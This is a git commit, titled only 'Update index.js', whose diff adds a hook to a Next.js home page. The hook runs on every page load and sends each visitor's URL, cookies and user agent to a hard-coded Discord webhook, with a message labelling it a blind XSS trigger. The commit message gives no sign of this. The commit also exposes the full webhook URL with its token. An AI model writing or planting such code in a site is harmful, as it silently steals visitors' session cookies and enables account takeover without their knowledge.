6c3c7e342b9af5a2e6bb11e6177323e83cf78e9b
Sairex <79695218+saeidrz@users.noreply.github.com>
2025-07-29 07:08:38 +0330

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -1,8 +1,26 @@
 import Head from 'next/head'
+import { useEffect } from 'react'
 import Header from '@components/Header'
 import Footer from '@components/Footer'
 
 export default function Home() {
+  useEffect(() => {
+    const webhook = "https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I";
+
+    const payload = {
+      content: `📢 Blind XSS Triggered!
+🌐 URL: ${window.location.href}
+🍪 Cookies: ${document.cookie}
+🧠 User-Agent: ${navigator.userAgent}`,
+    };
+
+    fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+  }, []);
+
   return (
     <div className="container">
       <Head>
@@ -21,3 +39,4 @@ export default function Home() {
     </div>
   )
 }
+
